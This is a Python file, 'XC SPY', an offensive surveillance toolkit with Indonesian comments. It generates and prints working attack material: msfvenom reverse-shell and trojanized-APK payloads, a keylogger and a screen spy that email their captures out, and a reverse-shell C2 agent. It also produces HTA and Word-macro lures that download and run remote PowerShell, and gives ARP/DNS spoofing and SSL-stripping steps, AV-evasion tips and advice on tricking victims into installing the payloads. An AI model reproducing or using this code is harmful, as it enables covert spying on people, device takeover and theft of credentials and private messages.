#!/usr/bin/env python3
"""
XC SPY — Person/Device Surveillance Toolkit
Specialize: RAT deploy, keylogger, screen capture, Android spy, C2 setup, social lure
Usage: python3 spy.py <mode> [options]
Modes: rat | keylogger | android | lure | network | c2 | full
"""
import sys, os, json, time, subprocess, textwrap, argparse, socket, threading

R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"; B = "\033[94m"
M = "\033[95m"; C = "\033[96m"; W = "\033[97m"; D = "\033[90m"
RST = "\033[0m"; BOLD = "\033[1m"

def banner():
    print(f"""{M}{BOLD}
 ██╗  ██╗ ██████╗    ███████╗██████╗ ██╗   ██╗
 ╚██╗██╔╝██╔════╝    ██╔════╝██╔══██╗╚██╗ ██╔╝
  ╚███╔╝ ██║         ███████╗██████╔╝ ╚████╔╝
  ██╔██╗ ██║         ╚════██║██╔═══╝   ╚██╔╝
 ██╔╝ ██╗╚██████╗    ███████║██║        ██║
 ╚═╝  ╚═╝ ╚═════╝    ╚══════╝╚═╝        ╚═╝
{D} Person & Device Surveillance — XC Hacking Hub{RST}
{D} RAT · Keylogger · Android · Screen · C2 · Lure{RST}
""")

def hit(msg):   print(f"  {R}{BOLD}[SPY]{RST} {Y}{msg}{RST}")
def ok(msg):    print(f"  {G}{BOLD}[+]{RST} {msg}")
def info(msg):  print(f"  {C}[*]{RST} {msg}")
def warn(msg):  print(f"  {Y}[!]{RST} {msg}")
def section(t): print(f"\n{M}{BOLD}{'─'*50}\n  {t}\n{'─'*50}{RST}")

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "YOUR_IP"

# ═══════════════════════════════════════════════════════
#  MODULE 1 — RAT PAYLOAD GENERATOR (Windows)
# ═══════════════════════════════════════════════════════

def module_rat(lhost=None, lport=4444, output="spy"):
    section("RAT PAYLOAD GENERATOR — Windows")

    if not lhost:
        lhost = get_local_ip()

    info(f"LHOST: {lhost} | LPORT: {lport}")

    # Metasploit commands
    section("STEP 1 — Generate Payload via Metasploit")
    print(f"""
{W}# Windows EXE (paling umum){RST}
{G}msfvenom -p windows/x64/meterpreter/reverse_tcp \\
  LHOST={lhost} LPORT={lport} \\
  -f exe -o {output}.exe{RST}

{W}# Disguise sebagai PDF (double extension){RST}
{G}msfvenom -p windows/x64/meterpreter/reverse_tcp \\
  LHOST={lhost} LPORT={lport} \\
  -f exe -o "Tugas_Sekolah.pdf.exe"{RST}

{W}# PowerShell one-liner (fileless){RST}
{G}msfvenom -p windows/x64/meterpreter/reverse_tcp \\
  LHOST={lhost} LPORT={lport} \\
  -f psh-reflection -o {output}.ps1{RST}

{W}# DLL payload (inject ke proses legit){RST}
{G}msfvenom -p windows/x64/meterpreter/reverse_tcp \\
  LHOST={lhost} LPORT={lport} \\
  -f dll -o {output}.dll{RST}
""")

    section("STEP 2 — Setup C2 Listener (Metasploit)")
    print(f"""
{C}msfconsole -q{RST}

{W}Di dalam msfconsole:{RST}
{G}use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
exploit -j{RST}

{W}Tunggu target jalankan payload → dapat session!{RST}
""")

    section("STEP 3 — Post Exploitation Commands")
    print(f"""
{W}Setelah dapat Meterpreter session:{RST}

{C}# Screen & Visual{RST}
{G}screenshot{RST}                    {D}← capture screen sekarang{RST}
{G}screenshare{RST}                   {D}← stream screen live{RST}
{G}webcam_list{RST}                   {D}← list kamera{RST}
{G}webcam_snap{RST}                   {D}← foto dari webcam{RST}
{G}webcam_stream{RST}                 {D}← stream webcam live{RST}

{C}# Audio{RST}
{G}run post/multi/manage/record_mic duration=30{RST}  {D}← rekam mic 30 detik{RST}

{C}# Keylogger{RST}
{G}keyscan_start{RST}                 {D}← mulai keylogger{RST}
{G}keyscan_dump{RST}                  {D}← ambil hasil log{RST}
{G}keyscan_stop{RST}

{C}# File & Data{RST}
{G}download C:\\Users\\target\\Desktop{RST}   {D}← ambil semua file Desktop{RST}
{G}search -f *.pdf -d C:\\{RST}             {D}← cari file PDF{RST}
{G}search -f password* -d C:\\{RST}         {D}← cari file password{RST}

{C}# Credential Harvest{RST}
{G}hashdump{RST}                      {D}← dump semua password hash{RST}
{G}run post/windows/gather/credentials/credential_collector{RST}
{G}run post/windows/gather/smart_hashdump{RST}

{C}# Persistence (stay setelah restart){RST}
{G}run post/windows/manage/persistence_exe STARTUP=SCHEDULER{RST}
{G}run post/windows/manage/persistence STARTUP=REGISTRY{RST}

{C}# Privilege Escalation{RST}
{G}getsystem{RST}                     {D}← auto privesc ke SYSTEM{RST}
{G}run post/multi/recon/local_exploit_suggester{RST}

{C}# Network Pivot{RST}
{G}run post/multi/manage/autoroute{RST}
{G}portfwd add -l 3389 -p 3389 -r 127.0.0.1{RST}  {D}← forward RDP{RST}
""")

    section("STEP 4 — AV Bypass (Payload Obfuscation)")
    print(f"""
{W}Payload mentah ketangkep AV → perlu di-encode/obfuscate:{RST}

{C}# Shikata Ga Nai encoder (paling umum){RST}
{G}msfvenom -p windows/x64/meterpreter/reverse_tcp \\
  LHOST={lhost} LPORT={lport} \\
  -e x64/xor_dynamic -i 5 \\
  -f exe -o {output}_encoded.exe{RST}

{C}# Shellcode → custom C loader (bypass Windows Defender){RST}
{G}msfvenom -p windows/x64/meterpreter/reverse_tcp \\
  LHOST={lhost} LPORT={lport} \\
  -f raw -o shellcode.bin{RST}

{W}Wrap di C loader → compile → lebih susah kedetect{RST}

{C}# Tool alternatif bypass AV:{RST}
{G}Veil Framework    → veil-evasion.py{RST}
{G}Shellter          → inject ke legit PE binary{RST}
{G}Donut             → shellcode generator advanced{RST}
{G}GoBfuscate        → Go-based payload obfuscator{RST}
""")

# ═══════════════════════════════════════════════════════
#  MODULE 2 — PYTHON KEYLOGGER (Standalone)
# ═══════════════════════════════════════════════════════

def module_keylogger(output_dir="."):
    section("KEYLOGGER GENERATOR — Python Standalone")

    keylogger_code = '''#!/usr/bin/env python3
# XC Keylogger — Stealth + Email Exfil
# pip install pynput pywin32

import os, sys, time, socket, getpass, platform
from pynput import keyboard
from datetime import datetime

# ── Config ──────────────────────────────
LOG_FILE    = os.path.join(os.getenv("TEMP", "/tmp"), "~sys_cache.tmp")
SEND_EMAIL  = False   # True = auto kirim via email
EMAIL_TO    = "your@email.com"
EMAIL_FROM  = "sender@gmail.com"
EMAIL_PASS  = "app_password"
INTERVAL    = 300     # kirim tiap 5 menit (detik)
# ────────────────────────────────────────

def get_sysinfo():
    return (f"[HOST:{socket.gethostname()}]"
            f"[USER:{getpass.getuser()}]"
            f"[OS:{platform.system()} {platform.release()}]"
            f"[TIME:{datetime.now().strftime('%Y-%m-%d %H:%M')}]\\n")

buffer = [get_sysinfo()]

def on_press(key):
    try:
        ch = key.char
        buffer.append(ch)
    except AttributeError:
        specials = {
            keyboard.Key.space:  " ",
            keyboard.Key.enter:  "\\n[ENTER]\\n",
            keyboard.Key.backspace: "[BS]",
            keyboard.Key.tab:    "[TAB]",
            keyboard.Key.caps_lock: "[CAPS]",
            keyboard.Key.ctrl_l: "[CTRL]",
            keyboard.Key.alt_l:  "[ALT]",
            keyboard.Key.shift:  "[SHIFT]",
            keyboard.Key.delete: "[DEL]",
        }
        buffer.append(specials.get(key, f"[{key}]"))

    if len(buffer) > 100:
        flush_log()

def flush_log():
    global buffer
    text = "".join(buffer)
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(text)
    buffer = []

def send_log():
    if not SEND_EMAIL:
        return
    try:
        import smtplib
        from email.mime.text import MIMEText
        with open(LOG_FILE, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
        if not content.strip():
            return
        msg = MIMEText(content)
        msg["Subject"] = f"[XC] {socket.gethostname()} — {datetime.now().strftime('%H:%M')}"
        msg["From"] = EMAIL_FROM
        msg["To"] = EMAIL_TO
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as s:
            s.login(EMAIL_FROM, EMAIL_PASS)
            s.send_message(msg)
        open(LOG_FILE, "w").close()  # clear setelah kirim
    except:
        pass

def exfil_loop():
    while True:
        time.sleep(INTERVAL)
        flush_log()
        send_log()

import threading
threading.Thread(target=exfil_loop, daemon=True).start()

listener = keyboard.Listener(on_press=on_press)
listener.start()
listener.join()
'''

    out_path = os.path.join(output_dir, "keylogger.py")
    with open(out_path, "w") as f:
        f.write(keylogger_code)

    ok(f"Keylogger saved: {out_path}")

    print(f"""
{C}Cara pakai:{RST}
{G}pip install pynput{RST}
{G}python keylogger.py{RST}

{C}Compile ke EXE (Windows, tanpa Python):{RST}
{G}pip install pyinstaller
pyinstaller --onefile --noconsole --hidden-import pynput.keyboard._win32 keylogger.py{RST}
{D}→ Output: dist/keylogger.exe — jalan diem-diem di background{RST}

{C}Log location:{RST}
{W}Windows: %TEMP%\\~sys_cache.tmp{RST}
{W}Linux:   /tmp/~sys_cache.tmp{RST}

{C}Email exfil:{RST}
{W}Set SEND_EMAIL = True → isi EMAIL_TO + EMAIL_PASS{RST}
{W}Gmail: pakai App Password (bukan password biasa){RST}
""")

# ═══════════════════════════════════════════════════════
#  MODULE 3 — ANDROID SPY APK
# ═══════════════════════════════════════════════════════

def module_android(lhost=None, lport=5555):
    section("ANDROID SPY APK GENERATOR")

    if not lhost:
        lhost = get_local_ip()

    print(f"""
{C}# Generate Android Meterpreter APK{RST}
{G}msfvenom -p android/meterpreter/reverse_tcp \\
  LHOST={lhost} LPORT={lport} \\
  -o spy_app.apk{RST}

{C}# Inject ke APK legit (lebih believable){RST}
{G}# Download APK target dulu (Instagram, WhatsApp clone, dll)
msfvenom -p android/meterpreter/reverse_tcp \\
  LHOST={lhost} LPORT={lport} \\
  -x original_app.apk \\
  -o trojanized_app.apk{RST}

{C}# Listener{RST}
{G}msfconsole -q -x "use exploit/multi/handler; \\
  set payload android/meterpreter/reverse_tcp; \\
  set LHOST {lhost}; set LPORT {lport}; exploit -j"{RST}

{W}Target install APK → dapat session Android{RST}
""")

    section("ANDROID POST EXPLOITATION")
    print(f"""
{C}# Data & Files{RST}
{G}dump_contacts{RST}          {D}← semua kontak{RST}
{G}dump_sms{RST}               {D}← semua SMS{RST}
{G}dump_calllog{RST}           {D}← call history{RST}
{G}geolocate{RST}              {D}← GPS location real-time{RST}

{C}# Surveillance{RST}
{G}webcam_snap -i 1{RST}       {D}← foto selfie kamera depan{RST}
{G}webcam_snap -i 2{RST}       {D}← foto kamera belakang{RST}
{G}webcam_stream{RST}          {D}← live camera{RST}
{G}record_mic -d 30{RST}       {D}← rekam mic 30 detik{RST}

{C}# Apps & Creds{RST}
{G}run post/android/gather/app_list{RST}      {D}← list semua app installed{RST}
{G}run post/android/gather/hashdump{RST}      {D}← credential hash{RST}
{G}run post/android/gather/screen_capture{RST}

{C}# WhatsApp / Telegram Data (root){RST}
{G}download /data/data/com.whatsapp/databases/{RST}
{G}download /data/data/org.telegram.messenger/files/{RST}

{C}# Persistence Android{RST}
{G}run post/android/manage/persistence{RST}
""")

    section("SOCIAL ENGINEERING — Cara Nyebarin APK")
    print(f"""
{Y}Metode distribusi:{RST}

{W}1. APK Mod / Crack{RST}
   {D}"Nih Instagram Premium mod, gratis premium fitur"{RST}
   {D}Kirim via Telegram/WhatsApp{RST}

{W}2. Update Palsu{RST}
   {D}"Update WhatsApp terbaru versi 2025" → APK trojan{RST}

{W}3. Game Cheat APK{RST}
   {D}"Nih cheat ML/FF/PUBG" → target gamers{RST}

{W}4. Fake App Store Page{RST}
   {D}Buat halaman mirip Play Store → target klik install{RST}
""")

# ═══════════════════════════════════════════════════════
#  MODULE 4 — LURE / SOCIAL ENGINEERING GENERATOR
# ═══════════════════════════════════════════════════════

def module_lure(target_name="target", lhost=None, lport=4444):
    section("SOCIAL ENGINEERING LURE GENERATOR")

    if not lhost:
        lhost = get_local_ip()

    print(f"""
{C}═══ LURE TEMPLATES ═══{RST}

{W}1. Fake File (Double Extension){RST}
{G}ren spy.exe "Foto_{target_name}_Private.jpg.exe"
ren spy.exe "Gaji_Slip_2025.pdf.exe"
ren spy.exe "Video_Viral.mp4.exe"
ren spy.exe "Invoice_Payment.xlsx.exe"{RST}

{W}2. PowerShell One-Liner (fileless, no file download){RST}
{G}powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://{lhost}/p.ps1')"{RST}

{W}3. HTA File (HTML Application — bypass SmartScreen){RST}
""")

    hta_content = f"""<html><head><script language="VBScript">
Set WShell = CreateObject("WScript.Shell")
WShell.Run "powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://{lhost}/p.ps1')", 0
self.close
</script></head><body>Loading...</body></html>"""

    hta_path = f"lure_{target_name}.hta"
    with open(hta_path, "w") as f:
        f.write(hta_content)
    ok(f"HTA lure saved: {hta_path}")

    print(f"""
{W}4. Macro Word Document{RST}
{D}Buat .docx → Insert → Macro → paste kode ini:{RST}
{G}Sub AutoOpen()
    Dim WShell As Object
    Set WShell = CreateObject("WScript.Shell")
    WShell.Run "powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://{lhost}/p.ps1')", 0, False
End Sub{RST}

{W}5. Setup HTTP Server (host payload){RST}
{G}# Di folder yang ada payload:
python3 -m http.server 80{RST}
{D}→ payload bisa didownload via http://{lhost}/spy.exe{RST}

{W}6. URL Shortener + Track{RST}
{G}# Pakai: shorturl.at / rb.gy / cutt.ly
# Atau self-host: github.com/YOURLS/YOURLS
# Track siapa yang klik + IP address mereka{RST}
""")

# ═══════════════════════════════════════════════════════
#  MODULE 5 — NETWORK SPY
# ═══════════════════════════════════════════════════════

def module_network(interface="wlan0"):
    section("NETWORK SPY — Intercept & Monitor")

    print(f"""
{C}═══ ARP SPOOFING (MITM) ═══{RST}
{W}Posisiin diri lo di antara target dan router → intercept semua traffic{RST}

{G}# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# ARP Spoof (arpspoof dari dsniff)
arpspoof -i {interface} -t TARGET_IP GATEWAY_IP &
arpspoof -i {interface} -t GATEWAY_IP TARGET_IP &

# Capture traffic
wireshark -i {interface} &
# atau
tcpdump -i {interface} -w capture.pcap host TARGET_IP{RST}

{C}═══ BETTERCAP (All-in-One MITM) ═══{RST}
{G}bettercap -iface {interface}

# Di bettercap shell:
net.probe on
net.show                    # list semua device
set arp.spoof.targets TARGET_IP
arp.spoof on
net.sniff on                # sniff traffic
http.proxy on               # intercept HTTP
https.proxy on              # intercept HTTPS (SSL strip){RST}

{C}═══ SSL STRIPPING ═══{RST}
{G}# Via bettercap (otomatis)
set https.proxy.sslstrip true
https.proxy on

# Manual via SSLstrip
sslstrip -l 8080
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080{RST}

{C}═══ DNS SPOOFING ═══{RST}
{G}# Redirect domain ke server lo
# Edit /etc/hosts atau via bettercap:
set dns.spoof.domains facebook.com,instagram.com
set dns.spoof.address {get_local_ip()}
dns.spoof on{RST}
{D}→ Target buka facebook.com → masuk ke server lo → phishing{RST}

{C}═══ PACKET ANALYSIS ═══{RST}
{G}# Extract credentials dari pcap
network-miner capture.pcap
dsniff -p capture.pcap

# HTTP credentials
strings capture.pcap | grep -E "(password|pass|login|user)"

# Wireshark filter:
http.request.method == "POST"
ftp || telnet || pop || imap || smtp{RST}
""")

# ═══════════════════════════════════════════════════════
#  MODULE 6 — C2 SERVER SETUP
# ═══════════════════════════════════════════════════════

def module_c2(lhost=None, lport=4444):
    section("C2 SERVER SETUP — Command & Control")

    if not lhost:
        lhost = get_local_ip()

    print(f"""
{C}═══ OPTION 1: METASPLOIT C2 ═══{RST}
{W}Paling mudah, fitur lengkap{RST}

{G}msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
exploit -j -z{RST}

{C}═══ OPTION 2: COVENANT C2 (Advanced) ═══{RST}
{W}Web UI, multi-operator, .NET based{RST}
{G}git clone https://github.com/cobbr/Covenant
cd Covenant/Covenant
dotnet run{RST}
{D}→ Web UI di https://localhost:7443{RST}

{C}═══ OPTION 3: SLIVER C2 (Modern, GoLang) ═══{RST}
{W}Open source, encrypted, implant generator{RST}
{G}curl https://sliver.sh/install | sudo bash
sliver-server
# Di sliver shell:
generate --mtls {lhost}:{lport} --os windows --save /tmp/implant.exe
mtls --lport {lport}
{RST}

{C}═══ OPTION 4: SIMPLE PYTHON C2 (Minimal) ═══{RST}
{W}No dependency, DIY, educational{RST}
""")

    simple_c2 = f'''#!/usr/bin/env python3
# XC Simple C2 Server
import socket, subprocess, threading

HOST = "0.0.0.0"
PORT = {lport}

def handle_client(conn, addr):
    print(f"[+] Agent connected: {{addr[0]}}")
    while True:
        try:
            cmd = input(f"[{lhost}]> ").strip()
            if not cmd: continue
            conn.send(cmd.encode())
            result = conn.recv(65535).decode(errors="ignore")
            print(result)
        except:
            break
    conn.close()

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server.bind((HOST, PORT))
server.listen(5)
print(f"[*] C2 listening on {{HOST}}:{{PORT}}")

while True:
    conn, addr = server.accept()
    threading.Thread(target=handle_client, args=(conn, addr)).start()
'''

    c2_agent = f'''#!/usr/bin/env python3
# XC C2 Agent — runs on target
import socket, subprocess, os, time

C2_HOST = "{lhost}"
C2_PORT = {lport}

while True:
    try:
        s = socket.socket()
        s.connect((C2_HOST, C2_PORT))
        while True:
            cmd = s.recv(4096).decode()
            if not cmd: break
            try:
                out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=10)
            except subprocess.CalledProcessError as e:
                out = e.output
            except Exception as e:
                out = str(e).encode()
            s.send(out or b"[no output]")
        s.close()
    except:
        time.sleep(10)  # retry tiap 10 detik
'''

    with open("c2_server.py", "w") as f:
        f.write(simple_c2)
    with open("c2_agent.py", "w") as f:
        f.write(c2_agent)

    ok("c2_server.py saved (jalankan di mesin lo)")
    ok("c2_agent.py saved (deploy ke target)")

    print(f"""
{C}Cara pakai Simple C2:{RST}
{G}# Di mesin lo:
python3 c2_server.py

# Deploy c2_agent.py ke target → jalankan
python3 c2_agent.py{RST}
{D}→ Target konek → lo dapat shell interaktif{RST}
""")

# ═══════════════════════════════════════════════════════
#  MODULE 7 — SCREEN CAPTURE SPY
# ═══════════════════════════════════════════════════════

def module_screen(output_dir="."):
    section("SCREEN SPY — Capture & Stream")

    screen_spy = '''#!/usr/bin/env python3
# XC Screen Spy — Silent screenshot + email exfil
# pip install pillow pyautogui smtplib

import os, time, io, smtplib, socket, threading
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from email.mime.text import MIMEText

try:
    import pyautogui
    HAS_GUI = True
except:
    HAS_GUI = False

# ── Config ──────────────────────────────
INTERVAL    = 60        # screenshot tiap 60 detik
SAVE_LOCAL  = True
SAVE_DIR    = os.path.join(os.getenv("TEMP", "/tmp"), "scr")
SEND_EMAIL  = False
EMAIL_TO    = "your@email.com"
EMAIL_FROM  = "sender@gmail.com"
EMAIL_PASS  = "app_password"
# ────────────────────────────────────────

os.makedirs(SAVE_DIR, exist_ok=True)

def take_screenshot():
    if not HAS_GUI:
        return None
    img = pyautogui.screenshot()
    return img

def save_and_send(img):
    if img is None:
        return
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    fname = os.path.join(SAVE_DIR, f"scr_{ts}.png")

    if SAVE_LOCAL:
        img.save(fname)

    if SEND_EMAIL:
        try:
            buf = io.BytesIO()
            img.save(buf, format="PNG")
            buf.seek(0)

            msg = MIMEMultipart()
            msg["Subject"] = f"[SCR] {socket.gethostname()} {ts}"
            msg["From"] = EMAIL_FROM
            msg["To"] = EMAIL_TO
            msg.attach(MIMEImage(buf.read()))

            with smtplib.SMTP_SSL("smtp.gmail.com", 465) as s:
                s.login(EMAIL_FROM, EMAIL_PASS)
                s.send_message(msg)
        except:
            pass

def spy_loop():
    while True:
        img = take_screenshot()
        save_and_send(img)
        time.sleep(INTERVAL)

threading.Thread(target=spy_loop, daemon=True).start()

# Keep alive
while True:
    time.sleep(3600)
'''

    out_path = os.path.join(output_dir, "screen_spy.py")
    with open(out_path, "w") as f:
        f.write(screen_spy)
    ok(f"Screen spy saved: {out_path}")

    print(f"""
{C}Cara pakai:{RST}
{G}pip install pillow pyautogui
python3 screen_spy.py{RST}

{C}Compile ke EXE:{RST}
{G}pyinstaller --onefile --noconsole screen_spy.py{RST}

{C}Screenshot tersimpan di:{RST}
{W}Windows: %TEMP%\\scr\\{RST}

{C}Live stream via Metasploit (lebih powerful):{RST}
{G}screenshare          ← real-time stream di Meterpreter{RST}
""")

# ═══════════════════════════════════════════════════════
#  FULL MODE
# ═══════════════════════════════════════════════════════

def full_mode(lhost=None, lport=4444):
    if not lhost:
        lhost = get_local_ip()

    section("XC SPY — FULL ARSENAL")
    print(f"""
{M}{BOLD}Target: {lhost}:{lport}{RST}
{W}Generating all spy modules...{RST}
""")
    module_rat(lhost, lport)
    module_keylogger()
    module_android(lhost, lport)
    module_lure("target", lhost, lport)
    module_network()
    module_c2(lhost, lport)
    module_screen()

    section("QUICK REFERENCE — ATTACK CHAIN")
    print(f"""
{M}CHAIN 1 — Windows PC Takeover:{RST}
{G}msfvenom → payload.exe → social lure → target klik → meterpreter{RST}
{D}Hasil: screen, webcam, mic, files, keylog, persist{RST}

{M}CHAIN 2 — Android Full Spy:{RST}
{G}msfvenom → trojan APK → "nih mod game" → install → meterpreter android{RST}
{D}Hasil: kontak, SMS, GPS, kamera, mic, WhatsApp DB{RST}

{M}CHAIN 3 — WiFi MITM:{RST}
{G}deauth + evil twin → target connect ke AP lo → bettercap MITM{RST}
{D}Hasil: intercept semua traffic, kredensial, session cookie{RST}

{M}CHAIN 4 — Persistent Silent:{RST}
{G}BadUSB colok 3 detik → auto deploy RAT → cabut → remote forever{RST}
{D}Hasil: invisible, persistent, full access{RST}
""")

# ═══════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════

# ═══════════════════════════════════════════════════════
#  INTERACTIVE MENU — CODENAME SYSTEM
# ═══════════════════════════════════════════════════════

CODENAMES = {
    # Modul utama
    "PHANTOM":   ("rat",       "Modul 1 — Kuasai PC target dari jarak jauh"),
    "SHADOW":    ("keylogger", "Modul 2 — Rekam semua ketikan diam-diam"),
    "SPECTRE":   ("android",   "Modul 3 — Masuk HP target lewat APK"),
    "MIRAGE":    ("lure",      "Modul 4 — Jebakan sosial buat nyebar payload"),
    "VENOM":     ("network",   "Modul 5 — Intercept semua traffic jaringan"),
    "NEXUS":     ("c2",        "Modul 6 — Pusat komando & kendali agent"),
    "ECLIPSE":   ("screen",    "Modul 7 — Rekam layar target diam-diam"),
    # Special
    "BLACKOUT":  ("full",      "FULL ARSENAL — Gas semua modul sekaligus"),
    # Alias shortcut
    "P":         ("rat",       None),
    "SH":        ("keylogger", None),
    "SP":        ("android",   None),
    "M":         ("lure",      None),
    "V":         ("network",   None),
    "N":         ("c2",        None),
    "E":         ("screen",    None),
    "B":         ("full",      None),
}

def menu_banner():
    print(f"""{M}{BOLD}
 ██╗  ██╗ ██████╗    ███████╗██████╗ ██╗   ██╗
 ╚██╗██╔╝██╔════╝    ██╔════╝██╔══██╗╚██╗ ██╔╝
  ╚███╔╝ ██║         ███████╗██████╔╝ ╚████╔╝
  ██╔██╗ ██║         ╚════██║██╔═══╝   ╚██╔╝
 ██╔╝ ██╗╚██████╗    ███████║██║        ██║
 ╚═╝  ╚═╝ ╚═════╝    ╚══════╝╚═╝        ╚═╝
{D}       Person & Device Surveillance System{RST}
{D}       XC Hacking Hub — Spy Division{RST}
""")

def show_menu(lhost):
    menu_banner()
    print(f"  {D}IP Aktif: {W}{lhost}{RST}\n")
    print(f"  {M}{BOLD}{'─'*44}{RST}")
    print(f"  {Y}{BOLD}  CODENAME     SHORTCUT   DESKRIPSI{RST}")
    print(f"  {M}{BOLD}{'─'*44}{RST}")

    modules = [
        ("PHANTOM",  "P",   "Modul 1", "Kuasai PC target dari jauh"),
        ("SHADOW",   "SH",  "Modul 2", "Rekam semua ketikan"),
        ("SPECTRE",  "SP",  "Modul 3", "Masuk HP via APK"),
        ("MIRAGE",   "M",   "Modul 4", "Jebakan sosial / lure"),
        ("VENOM",    "V",   "Modul 5", "Intercept traffic jaringan"),
        ("NEXUS",    "N",   "Modul 6", "Pusat komando agent"),
        ("ECLIPSE",  "E",   "Modul 7", "Rekam layar diam-diam"),
    ]

    for name, short, num, desc in modules:
        print(f"  {C}{name:<12}{RST}  [{W}{short}{RST}]   {D}{num} — {desc}{RST}")

    print(f"  {M}{BOLD}{'─'*44}{RST}")
    print(f"  {R}{BOLD}BLACKOUT{RST}      [{W}B{RST}]   {R}FULL ARSENAL — Gas semua!{RST}")
    print(f"  {M}{BOLD}{'─'*44}{RST}")
    print(f"  {D}exit / quit / q  → keluar{RST}\n")

def interactive_menu(lhost, lport, target, iface):
    modes_map = {
        "rat":       lambda: module_rat(lhost, lport),
        "keylogger": lambda: module_keylogger(),
        "android":   lambda: module_android(lhost, lport),
        "lure":      lambda: module_lure(target, lhost, lport),
        "network":   lambda: module_network(iface),
        "c2":        lambda: module_c2(lhost, lport),
        "screen":    lambda: module_screen(),
        "full":      lambda: full_mode(lhost, lport),
    }

    show_menu(lhost)

    while True:
        try:
            cmd = input(f"\n  {M}XC-SPY{RST} {D}»{RST} ").strip().upper()
        except (KeyboardInterrupt, EOFError):
            print(f"\n\n  {D}Session ended. DAR DER DOR.{RST}\n")
            break

        if not cmd:
            continue

        if cmd in ("EXIT", "QUIT", "Q"):
            print(f"\n  {D}Session ended. DAR DER DOR.{RST}\n")
            break

        if cmd == "HELP" or cmd == "?":
            show_menu(lhost)
            continue

        if cmd == "CLEAR" or cmd == "CLS":
            os.system("clear" if os.name != "nt" else "cls")
            show_menu(lhost)
            continue

        if cmd in CODENAMES:
            mode_key, desc = CODENAMES[cmd]
            if desc:
                print(f"\n  {M}[EXECUTING]{RST} {Y}{cmd}{RST} — {D}{desc}{RST}")
                time.sleep(0.3)
            modes_map[mode_key]()
        else:
            # Coba partial match
            matches = [k for k in CODENAMES if k.startswith(cmd) and CODENAMES[k][1]]
            if len(matches) == 1:
                mode_key, desc = CODENAMES[matches[0]]
                print(f"\n  {M}[EXECUTING]{RST} {Y}{matches[0]}{RST} — {D}{desc}{RST}")
                time.sleep(0.3)
                modes_map[mode_key]()
            elif len(matches) > 1:
                print(f"\n  {Y}[?]{RST} Ambiguous: {', '.join(matches)}")
            else:
                print(f"\n  {R}[!]{RST} Unknown codename: {cmd}")
                print(f"  {D}Ketik HELP atau ? buat lihat menu{RST}")

def main():
    parser = argparse.ArgumentParser(
        description="XC SPY — Person/Device Surveillance Toolkit",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument("mode", nargs="?", default=None,
        help=(
            "Codename mode (opsional — kalau kosong masuk interactive menu)\n\n"
            "PHANTOM  / P   → Modul 1: PC Takeover\n"
            "SHADOW   / SH  → Modul 2: Keylogger\n"
            "SPECTRE  / SP  → Modul 3: Android Spy\n"
            "MIRAGE   / M   → Modul 4: Social Lure\n"
            "VENOM    / V   → Modul 5: Network MITM\n"
            "NEXUS    / N   → Modul 6: C2 Server\n"
            "ECLIPSE  / E   → Modul 7: Screen Spy\n"
            "BLACKOUT / B   → FULL ARSENAL\n"
        ))
    parser.add_argument("--lhost", help="Your IP (auto-detect jika kosong)")
    parser.add_argument("--lport", type=int, default=4444, help="Listen port (default: 4444)")
    parser.add_argument("--target", default="target", help="Target name untuk lure files")
    parser.add_argument("--iface", default="wlan0", help="Network interface (default: wlan0)")

    args = parser.parse_args()
    lhost = args.lhost or get_local_ip()

    # Map codename → mode
    mode_lookup = {k: v[0] for k, v in CODENAMES.items()}

    modes_map = {
        "rat":       lambda: module_rat(lhost, args.lport),
        "keylogger": lambda: module_keylogger(),
        "android":   lambda: module_android(lhost, args.lport),
        "lure":      lambda: module_lure(args.target, lhost, args.lport),
        "network":   lambda: module_network(args.iface),
        "c2":        lambda: module_c2(lhost, args.lport),
        "screen":    lambda: module_screen(),
        "full":      lambda: full_mode(lhost, args.lport),
    }

    if args.mode is None:
        # Interactive menu mode
        interactive_menu(lhost, args.lport, args.target, args.iface)
    else:
        banner()
        key = args.mode.upper()
        if key in mode_lookup:
            modes_map[mode_lookup[key]]()
        elif args.mode in modes_map:
            modes_map[args.mode]()
        else:
            print(f"{R}[!] Unknown mode: {args.mode}{RST}")
            print(f"{D}Ketik: python3 spy.py --help{RST}")

if __name__ == "__main__":
    main()
